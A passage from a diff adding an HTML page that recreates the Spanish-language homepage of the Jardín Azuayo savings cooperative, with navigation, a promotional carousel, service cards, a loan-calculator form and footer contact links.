@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <!-- Anti-Cache for fresh assets -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
+    <title>Cooperativa de Ahorro y Crédito Jardín Azuayo</title>
+    <meta name="description" content="Jardín Azuayo - Cooperativa de Ahorro y Crédito sólida y confiable. Calificación AA+. Servicios financieros, créditos, ahorros y Jardín Azuayo Virtual.">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="jardinazuayo_img/javirtual/03-favicon.ico">
+    <link rel="apple-touch-icon" href="jardinazuayo_img/web/04-apple-touch-180.png">
+
+    <!-- Typography: Inter + Outfit for crisp, premium feel -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- VIEW 1: SITIO PRINCIPAL (HOMEPAGE)                          -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <div id="view-home" class="page-view active">
+
+        <!-- Top Utility Bar (Desktop only) -->
+        <div class="topbar">
+            <div class="container topbar__inner">
+                <div class="topbar__left">
+                    <span class="topbar__item">
+                        <svg class="topbar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                        <a href="#contacto">¿Necesitas ayuda?</a>
+                    </span>
+                    <span class="topbar__item">
+                        <svg class="topbar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path>
+                        </svg>
+                        <a href="https://wa.me/593959181350" target="_blank" rel="noopener">(+593) 0959181350</a>
+                    </span>
+                    <span class="topbar__item">
+                        <svg class="topbar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                        </svg>
+                        <a href="tel:074134503">Call Center: (07) 413-4503</a>
+                    </span>
+                </div>
+                <div class="topbar__right">
+                    <a href="#servicios" class="topbar__link">Ahorros</a>
+                    <a href="#calculadora" class="topbar__link">Créditos</a>
+                    <a href="#" class="topbar__link" onclick="goToView('javirtual'); return false;">Servicios Virtuales</a>
+                    <a href="#contacto" class="topbar__link">Turnos en línea</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Navigation Header -->
+        <header class="main-header" id="mainHeader">
+            <div class="container main-header__inner">
+                <!-- Logo -->
+                <a href="#" class="main-header__logo" onclick="goToView('home'); return false;">
+                    <img src="jardinazuayo_img/web/01-Frame-3.png" alt="Jardín Azuayo - Cooperativa de Ahorro y Crédito" class="header-logo-img">
+                </a>
+
+                <!-- Search Input (Desktop) -->
+                <div class="main-header__search">
+                    <form class="search-form" onsubmit="event.preventDefault();">
+                        <input type="text" placeholder="Buscar en el sitio" aria-label="Buscar en el sitio">
+                        <button type="submit" class="search-btn" aria-label="Buscar">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="11" cy="11" r="8"></circle>
+                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                            </svg>
+                        </button>
+                    </form>
+                </div>
+
+                <!-- Desktop Menu -->
+                <nav class="main-nav" aria-label="Navegación principal">
+                    <ul class="main-nav__list">
+                        <li class="main-nav__item active"><a href="#view-home">Inicio</a></li>
+                        <li class="main-nav__item"><a href="#socio-section">Historia</a></li>
+                        <li class="main-nav__item"><a href="#socio-section">Nosotros</a></li>
+                        <li class="main-nav__item"><a href="#servicios">Servicios</a></li>
+                        <li class="main-nav__item"><a href="#calculadora">Calculadoras</a></li>
+                        <li class="main-nav__item"><a href="#contacto">Encuéntranos</a></li>
+                        <li class="main-nav__item"><a href="#contacto">Más</a></li>
+                    </ul>
+                </nav>
+
+                <!-- CTA Button (Desktop) -->
+                <div class="main-header__cta">
+                    <button class="btn btn-virtual" onclick="goToView('javirtual')">
+                        JARDÍN AZUAYO VIRTUAL
+                    </button>
+                </div>
+
+                <!-- Mobile Right Controls (JA Virtual mini + Hamburger) -->
+                <div class="main-header__mobile-controls">
+                    <button class="btn-mobile-virtual" onclick="goToView('javirtual')" title="Ingresar a JA Virtual">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        <span>VIRTUAL</span>
+                    </button>
+                    <button class="mobile-toggle" id="mobileMenuToggle" aria-label="Abrir menú" onclick="toggleMobileMenu()">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <!-- Mobile Drawer Menu Overlay -->
+        <div class="mobile-drawer-overlay" id="mobileDrawerOverlay" onclick="closeMobileMenu()"></div>
+        <aside class="mobile-drawer" id="mobileDrawer">
+            <div class="mobile-drawer__header">
+                <img src="jardinazuayo_img/web/01-Frame-3.png" alt="Jardín Azuayo" class="mobile-drawer__logo">
+                <button class="mobile-drawer__close" onclick="closeMobileMenu()" aria-label="Cerrar menú">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                </button>
+            </div>
+
+            <div class="mobile-drawer__body">
+                <div class="mobile-drawer__cta">
+                    <button class="btn btn-virtual-full" onclick="closeMobileMenu(); goToView('javirtual');">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        JARDÍN AZUAYO VIRTUAL
+                    </button>
+                </div>
+
+                <div class="mobile-drawer__search">
+                    <form class="search-form-mobile" onsubmit="event.preventDefault();">
+                        <input type="text" placeholder="Buscar en el sitio...">
+                        <button type="submit" aria-label="Buscar">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="11" cy="11" r="8"></circle>
+                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                            </svg>
+                        </button>
+                    </form>
+                </div>
+
+                <ul class="mobile-nav__links">
+                    <li><a href="#view-home" onclick="closeMobileMenu();">Inicio</a></li>
+                    <li><a href="#socio-section" onclick="closeMobileMenu();">Historia</a></li>
+                    <li><a href="#socio-section" onclick="closeMobileMenu();">Nosotros</a></li>
+                    <li><a href="#servicios" onclick="closeMobileMenu();">Servicios</a></li>
+                    <li><a href="#calculadora" onclick="closeMobileMenu();">Calculadoras</a></li>
+                    <li><a href="#contacto" onclick="closeMobileMenu();">Encuéntranos</a></li>
+                    <li><a href="#contacto" onclick="closeMobileMenu();">Más</a></li>
+                </ul>
+
+                <div class="mobile-drawer__contact">
+                    <h4>Canales de Atención</h4>
+                    <a href="tel:074134503" class="mobile-contact-item">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                        </svg>
+                        <span>Call Center: (07) 413-4503</span>
+                    </a>
+                    <a href="https://wa.me/593959181350" target="_blank" rel="noopener" class="mobile-contact-item">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path>
+                        </svg>
+                        <span>WhatsApp: (+593) 0959181350</span>
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+        <!-- ═══════════════════════════════════════════════════ -->
+        <!-- HERO CAROUSEL                                       -->
+        <!-- ═══════════════════════════════════════════════════ -->
+        <section class="hero-section">
+            <div class="carousel-container" id="heroCarousel">
+                <!-- Slide 1: AA+ Rating -->
+                <div class="carousel-slide active" data-slide="0">
+                    <div class="container hero-slide__inner">
+                        <div class="hero-slide__image-wrap">
+                            <img src="jardinazuayo_img/web/08-calificacion.png" alt="Tenemos calificación AA+ - PCR Pacific Credit Rating" class="hero-cert-img">
+                        </div>
+                        <div class="hero-slide__content">
+                            <span class="hero-tag">Calificación de Riesgo</span>
+                            <h1 class="hero-title">Tenemos calificación AA+</h1>
+                            <p class="hero-desc">Nuestra institución es sólida financieramente y tiene buenos antecedentes de desempeño.</p>
+                            <a href="#socio-section" class="btn btn-primary-green">Más información</a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Slide 2: Slide 001 -->
+                <div class="carousel-slide" data-slide="1">
+                    <div class="container hero-slide__inner">
+                        <div class="hero-slide__image-wrap">
+                            <img src="jardinazuayo_img/web/12-slide-001.png" alt="Ahorro y Crédito para tus metas" class="hero-cert-img">
+                        </div>
+                        <div class="hero-slide__content">
+                            <span class="hero-tag">Ahorro y Futuro</span>
+                            <h2 class="hero-title">Impulsamos tus metas y proyectos</h2>
+                            <p class="hero-desc">Descubre nuestras tasas de ahorro preferenciales y soluciones de crédito diseñadas para ti.</p>
+                            <a href="#calculadora" class="btn btn-primary-green">Calcula tu crédito</a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Slide 3: Slide 003 -->
+                <div class="carousel-slide" data-slide="2">
+                    <div class="container hero-slide__inner">
+                        <div class="hero-slide__image-wrap">
+                            <img src="jardinazuayo_img/web/10-slide-003.png" alt="Educación e Inclusión Financiera" class="hero-cert-img">
+                        </div>
+                        <div class="hero-slide__content">
+                            <span class="hero-tag">Comunidad y Cooperativismo</span>
+                            <h2 class="hero-title">Crecemos juntos en cada rincón del país</h2>
+                            <p class="hero-desc">Más que servicios financieros, construimos futuro y bienestar junto a nuestros socios.</p>
+                            <a href="#socio-section" class="btn btn-primary-green">Hazte socio hoy</a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Carousel Controls -->
+                <button class="carousel-arrow carousel-arrow--prev" onclick="prevSlide()" aria-label="Slide anterior">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <polyline points="15 18 9 12 15 6"></polyline>
+                    </svg>
+                </button>
+                <button class="carousel-arrow carousel-arrow--next" onclick="nextSlide()" aria-label="Siguiente slide">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <polyline points="9 18 15 12 9 6"></polyline>
+                    </svg>
+                </button>
+
+                <!-- Carousel Indicators -->
+                <div class="carousel-dots">
+                    <button class="dot active" onclick="goToSlide(0)" aria-label="Slide 1"></button>
+                    <button class="dot" onclick="goToSlide(1)" aria-label="Slide 2"></button>
+                    <button class="dot" onclick="goToSlide(2)" aria-label="Slide 3"></button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════════════════════════════════════════════ -->
+        <!-- NUESTROS SERVICIOS                                  -->
+        <!-- ═══════════════════════════════════════════════════ -->
+        <section class="section-servicios" id="servicios">
+            <div class="container">
+                <h2 class="section-heading">Nuestros Servicios</h2>
+
+                <div class="services-grid">
+                    <!-- Service Card 1: Ahorros -->
+                    <div class="service-card">
+                        <div class="service-card__icon-box">
+                            <img src="jardinazuayo_img/web/16-icono-001.png" alt="Icono Ahorros" class="service-icon">
+                        </div>
+                        <h3 class="service-card__title">Ahorros</h3>
+                        <p class="service-card__desc">¡Ahorrar es invertir en el futuro! Conoce nuestros tipos de ahorro y calcula los intereses que generan.</p>
+                        <button class="btn btn-card-green" onclick="scrollToCalculator('ahorros')">Calcular interés</button>
+                    </div>
+
+                    <!-- Service Card 2: Créditos -->
+                    <div class="service-card">
+                        <div class="service-card__icon-box">
+                            <img src="jardinazuayo_img/web/17-icono-002.png" alt="Icono Créditos" class="service-icon">
+                        </div>
+                        <h3 class="service-card__title">Créditos</h3>
+                        <p class="service-card__desc">¿Necesitas financiamiento? Conoce nuestros tipos de créditos, los intereses que generan y los requisitos necesarios.</p>
+                        <button class="btn btn-card-green" onclick="scrollToCalculator('creditos')">Calcular interés</button>
+                    </div>
+
+                    <!-- Service Card 3: Línea de Crédito -->
+                    <div class="service-card">
+                        <div class="service-card__icon-box">
+                            <img src="jardinazuayo_img/web/18-icono-003.png" alt="Icono Línea de Crédito" class="service-icon">
+                        </div>
+                        <h3 class="service-card__title">Línea de Crédito</h3>
+                        <p class="service-card__desc">¿Tienes un emprendimiento o gastos recurrentes? Accede a nuestra línea de crédito y paga intereses únicamente por los días que utilizas tu avance.</p>
+                        <button class="btn btn-card-green" onclick="scrollToCalculator('linea')">Necesito más información</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════════════════════════════════════════════ -->
+        <!-- CONVIÉRTETE EN SOCIO                                -->
+        <!-- ═══════════════════════════════════════════════════ -->
+        <section class="section-socio" id="socio-section">
+            <div class="container socio-container">
+                <div class="socio-content">
+                    <h2 class="socio-title">¡Conviértete en socio y accede a nuestros servicios!</h2>
+                    <p class="socio-desc">Abre hoy tu cuenta en la agencia más cercana y sé parte de Jardín Azuayo.</p>
+                    <a href="#contacto" class="btn btn-primary-green">Encuéntranos</a>
+                    <div class="socio-cenefa">
+                        <img src="jardinazuayo_img/web/15-cenefa-1-1.png" alt="Cenefa tradicional Jardín Azuayo" class="cenefa-img">
+                    </div>
+                </div>
+                <div class="socio-image-wrap">
+                    <img src="jardinazuayo_img/web/24-socio.png" alt="Socio Jardín Azuayo con laptop" class="socio-character-img">
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════════════════════════════════════════════ -->
+        <!-- CALCULADORA DE CRÉDITO                              -->
+        <!-- ═══════════════════════════════════════════════════ -->
+        <section class="section-calculadora" id="calculadora">
+            <div class="container calculadora-container">
+                <!-- Left Info & Illustration -->
+                <div class="calc-info">
+                    <h2 class="calc-info__title">¿Necesitas financiamiento? Te ayudamos a cumplir tus metas.</h2>
+                    <p class="calc-info__desc">Conoce y revisa nuestros tipos de crédito según tu necesidad: iniciar tu emprendimiento, financiar tus estudios, cubrir una emergencia o adquirir un medio de transporte.</p>
+                    <p class="calc-info__desc-sub">Descubre las diferentes opciones que tenemos.</p>
+                    <a href="#contacto" class="btn btn-primary-green calc-info__btn">Más información</a>
+                    <div class="calc-info__artwork">
+                        <img src="jardinazuayo_img/web/26-creditos.png" alt="Invertir en la esperanza - Créditos Jardín Azuayo" class="artwork-creditos-img">
+                    </div>
+                </div>
+
+                <!-- Right Form Card -->
+                <div class="calc-card">
+                    <div class="calc-card__header">
+                        <div class="calc-card__logo-mark">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="#de3631">
+                                <circle cx="12" cy="7" r="3.5"></circle>
+                                <circle cx="7" cy="12" r="3.5"></circle>
+                                <circle cx="17" cy="12" r="3.5"></circle>
+                                <circle cx="9.5" cy="17" r="3.5"></circle>
+                                <circle cx="14.5" cy="17" r="3.5"></circle>
+                            </svg>
+                        </div>
+                        <h3 class="calc-card__title">Calculadora de Crédito</h3>
+                    </div>
+
+                    <form id="creditCalculatorForm" class="calc-form" onsubmit="calculateLoan(event)">
+                        <!-- Monto -->
+                        <div class="form-group">
+                            <label class="form-label" for="calcMonto">
+                                Monto
+                                <span class="info-tooltip" title="Monto solicitado para el crédito en dólares americanos ($)">ⓘ</span>
+                            </label>
+                            <div class="input-with-icon">
+                                <span class="input-icon">💵</span>
+                                <input type="number" id="calcMonto" class="form-control" placeholder="Ej: 5000" min="100" max="100000" step="50" value="5000" required>
+                            </div>
+                        </div>
+
+                        <!-- Plazo en Meses -->
+                        <div class="form-group">
+                            <label class="form-label" for="calcPlazo">
+                                Plazo en Meses
+                                <span class="info-tooltip" title="Número de meses en los que amortizarás el crédito">ⓘ</span>
+                            </label>
+                            <div class="input-with-icon">
+                                <span class="input-icon">📅</span>
+                                <input type="number" id="calcPlazo" class="form-control" placeholder="Ej: 24" min="1" max="120" value="24" required>
+                            </div>
+                        </div>
+
+                        <!-- Frecuencia de Pago -->
+                        <div class="form-group">
+                            <label class="form-label" for="calcFrecuencia">
+                                Frecuencia de Pago
+                                <span class="info-tooltip" title="Periodicidad con la que cancelarás las cuotas">ⓘ</span>
+                            </label>
+                            <select id="calcFrecuencia" class="form-control form-select">
+                                <option value="mensual" selected>MENSUAL</option>
+                                <option value="trimestral">TRIMESTRAL</option>
+                                <option value="semestral">SEMESTRAL</option>
+                            </select>
+                        </div>
+
+                        <!-- Segmento de Crédito -->
+                        <div class="form-group">
+                            <label class="form-label" for="calcSegmento">
+                                Segmento de Crédito
+                                <span class="info-tooltip" title="Segmento destino de los fondos del crédito">ⓘ</span>
+                            </label>
+                            <select id="calcSegmento" class="form-control form-select" onchange="updateCreditTypes()">
+                                <option value="consumo" selected>Consumo</option>
+                                <option value="microcredito">Microcrédito</option>
+                                <option value="vivienda">Vivienda</option>
+                                <option value="comercial">Comercial</option>
+                            </select>
+                        </div>
+
+                        <!-- Tipo de Crédito -->
+                        <div class="form-group">
+                            <label class="form-label" for="calcTipo">
+                                Tipo de Crédito
+                                <span class="info-tooltip" title="Tasa de interés referencial según el producto">ⓘ</span>
+                            </label>
+                            <select id="calcTipo" class="form-control form-select">
+                                <option value="12.77" selected>Crédito con Ahorro 12.77%</option>
+                                <option value="15.60">Crédito Ordinario 15.60%</option>
+                                <option value="18.50">Microcrédito Productivo 18.50%</option>
+                                <option value="10.50">Crédito Hipotecario 10.50%</option>
+                            </select>
+                        </div>
+
+                        <!-- Estado Civil -->
+                        <div class="form-group">
+                            <label class="form-label" for="calcEstadoCivil">
+                                Estado Civil
+                                <span class="info-tooltip" title="Estado civil del solicitante principal">ⓘ</span>
+                            </label>
+                            <select id="calcEstadoCivil" class="form-control form-select">
+                                <option value="casado" selected>Casado/a, Unión Libre</option>
+                                <option value="soltero">Soltero/a</option>
+                                <option value="divorciado">Divorciado/a</option>
+                                <option value="viudo">Viudo/a</option>
+                            </select>
+                        </div>
+
+                        <!-- Edad -->
+                        <div class="form-group">
+                            <label class="form-label" for="calcEdad">
+                                Edad
+                                <span class="info-tooltip" title="Rango de edad del solicitante">ⓘ</span>
+                            </label>
+                            <select id="calcEdad" class="form-control form-select">
+                                <option value="18-70" selected>De 18 a 70 años</option>
+                                <option value="71+">Mayor de 70 años</option>
+                            </select>
+                        </div>
+
+                        <!-- Tipo de Cuota -->
+                        <div class="form-group form-group--radio">
+                            <label class="form-label">
+                                Tipo de Cuota
+                                <span class="info-tooltip" title="Sistema de amortización: Francés (cuotas constantes) o Alemán (cuotas decrecientes)">ⓘ</span>
+                            </label>
+                            <div class="radio-options">
+                                <label class="radio-label">
+                                    <input type="radio" name="tipoCuota" value="frances" checked>
+                                    <span class="custom-radio"></span>
+                                    <span>CUOTAS FIJAS (FRANCÉS)</span>
+                                </label>
+                                <label class="radio-label">
+                                    <input type="radio" name="tipoCuota" value="aleman">
+                                    <span class="custom-radio"></span>
+                                    <span>CUOTAS DECRECIENTES (ALEMÁN)</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <button type="submit" class="btn btn-calc-submit">Calcular</button>
+                    </form>
+
+                    <!-- Results Breakdown (Appears smoothly after calculation) -->
+                    <div id="calcResults" class="calc-results" style="display: none;">
+                        <div class="calc-results__header">
+                            <h4>Resumen de Simulación</h4>
+                            <button class="calc-results__close" onclick="closeCalcResults()" title="Cerrar">✕</button>
+                        </div>
+                        <div class="calc-results__body">
+                            <div class="calc-metric-highlight">
+                                <span class="metric-label">Cuota mensual estimada:</span>
+                                <span class="metric-value" id="resCuota">$ 0.00</span>
+                            </div>
+                            <div class="calc-metrics-grid">
+                                <div class="metric-item">
+                                    <span class="m-label">Monto:</span>
+                                    <span class="m-val" id="resMonto">$ 0</span>
+                                </div>
+                                <div class="metric-item">
+                                    <span class="m-label">Plazo:</span>
+                                    <span class="m-val" id="resPlazo">0 meses</span>
+                                </div>
+                                <div class="metric-item">
+                                    <span class="m-label">Tasa Anual:</span>
+                                    <span class="m-val" id="resTasa">0.00%</span>
+                                </div>
+                                <div class="metric-item">
+                                    <span class="m-label">Interés Total:</span>
+                                    <span class="m-val" id="resInteres">$ 0.00</span>
+                                </div>
+                                <div class="metric-item highlight-total">
+                                    <span class="m-label">Total a Pagar:</span>
+                                    <span class="m-val" id="resTotal">$ 0.00</span>
+                                </div>
+                            </div>
+                            <p class="calc-legal-note">* Simulación referencial calculada con el sistema seleccionado. Sujeta a aprobación crediticia.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════════════════════════════════════════════════ -->
+        <!-- BANNER DE AHORRO                                    -->
+        <!-- ═══════════════════════════════════════════════════ -->
+        <section class="section-banner-ahorro">
+            <div class="container banner-ahorro__container">
+                <div class="banner-ahorro__content">
+                    <h2 class="banner-ahorro__title">Es hora de iniciar tu plan de ahorro</h2>
+                    <p class="banner-ahorro__desc">Un ahorro es un respaldo para emergencias y una oportunidad para iniciar tus proyectos.</p>
+                </div>
+                <div class="banner-ahorro__action">
+                    <button class="btn btn-lime" onclick="openAhorroModal()">Calcular intereses</button>
+                </div>
+                <div class="banner-ahorro__pattern" style="background-image: url('jardinazuayo_img/web/38-banda-ahorro.png');"></div>
+            </div>
+        </section>
+
+        <!-- ═══════════════════════════════════════════════════ -->
+        <!-- FOOTER                                              -->
+        <!-- ═══════════════════════════════════════════════════ -->
+        <footer class="site-footer" id="contacto">
+            <!-- 4 Columns Footer -->
+            <div class="container footer-columns">
+                <div class="footer-col">
+                    <h3 class="footer-col__title">Enlaces populares</h3>
+                    <ul class="footer-col__list">
+                        <li><a href="#">Intranet</a></li>
+                        <li><a href="#" onclick="goToView('javirtual'); return false;">Jardín Azuayo Virtual</a></li>
+                        <li><a href="#contacto">Asesoría en Línea</a></li>
+                        <li><a href="#calculadora">Calculadora de Crédito</a></li>
+                        <li><a href="#" onclick="openAhorroModal(); return false;">Calculadora de Ahorro</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h3 class="footer-col__title">Navegación</h3>
+                    <ul class="footer-col__list">
+                        <li><a href="#view-home">Inicio</a></li>
+                        <li><a href="#socio-section">Nosotros</a></li>
+                        <li><a href="#" onclick="goToView('javirtual'); return false;">Servicios Virtuales</a></li>
+                        <li><a href="#">Noticias</a></li>
+                        <li><a href="#contacto">Encuéntranos</a></li>
+                        <li><a href="#">Transparencia</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h3 class="footer-col__title">Otros enlaces</h3>
+                    <ul class="footer-col__list">
+                        <li><a href="#">Política de protección de datos</a></li>
+                        <li><a href="#">Reclamos y Sugerencias</a></li>
+                        <li><a href="#">Comunidad de socios migrantes</a></li>
+                        <li><a href="#">Turnos en línea</a></li>
+                        <li><a href="#">Manual de Usuario IVR</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h3 class="footer-col__title">Contáctanos</h3>
+                    <div class="footer-contact-info">
+                        <p><strong>Call Center:</strong><br><a href="tel:074134503">(07) - 4134503</a></p>
+                        <p><strong>EE. UU. y Canadá:</strong><br><a href="tel:19563985383">1-956 398 5383</a></p>
+                        <p><strong>WhatsApp Oficial:</strong><br><a href="https://wa.me/593959181350" target="_blank" rel="noopener">+593 95 918 1350</a></p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Colorful Tribal Footer Border -->
+            <div class="footer-tribal-border">
+                <img src="jardinazuayo_img/web/41-banda-footer.png" alt="Cenefa cultural Jardín Azuayo" class="tribal-band-img">
+            </div>
+
+            <!-- Bottom Dark Green Bar -->
+            <div class="bottom-footer-bar">
+                <div class="container bottom-footer-bar__inner">
+                    <!-- Social Links -->
+                    <div class="footer-social">
+                        <!-- Facebook -->
+                        <a href="https://facebook.com/jardinazuayo" target="_blank" rel="noopener" aria-label="Facebook">
+                            <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H7v-3h3V9.5C10 6.46 11.82 5 14.54 5c1.3 0 2.66.24 2.66.24v2.93h-1.5c-1.5 0-1.7.93-1.7 1.89V12h3.3l-.53 3h-2.77v6.8c4.56-.93 8-4.96 8-9.8z"/></svg>
+                        </a>
+                        <!-- Instagram -->
+                        <a href="https://instagram.com/jardin.azuayo" target="_blank" rel="noopener" aria-label="Instagram">
+                            <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+                        </a>
+                        <!-- X (Twitter) -->
+                        <a href="https://x.com/JardinAzuayo" target="_blank" rel="noopener" aria-label="X">
+                            <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                        </a>
+                        <!-- YouTube -->
+                        <a href="https://youtube.com/jardinazuayo" target="_blank" rel="noopener" aria-label="YouTube">
+                            <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+                        </a>
+                        <!-- LinkedIn -->
+                        <a href="https://linkedin.com/company/cooperativa-jardin-azuayo" target="_blank" rel="noopener" aria-label="LinkedIn">
